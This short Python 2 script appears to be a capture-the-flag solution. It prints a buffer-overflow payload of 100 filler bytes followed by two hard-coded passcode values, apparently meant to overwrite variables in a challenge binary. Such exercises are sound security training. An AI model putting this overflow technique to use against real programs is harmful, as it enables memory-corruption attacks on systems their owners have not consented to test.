
p1_int = 0x000528e6
p2_int = 0x00cc07c9

passcode1 = '\x00\x05\x28\xe6'
passcode2 = '\x00\xcc\x07\xc9'

p = 'a'*100 + passcode1 + passcode2

print 'a'*100 + '\x00\x05\x28\xe6' + '\x00\xcc\x07\xc9'

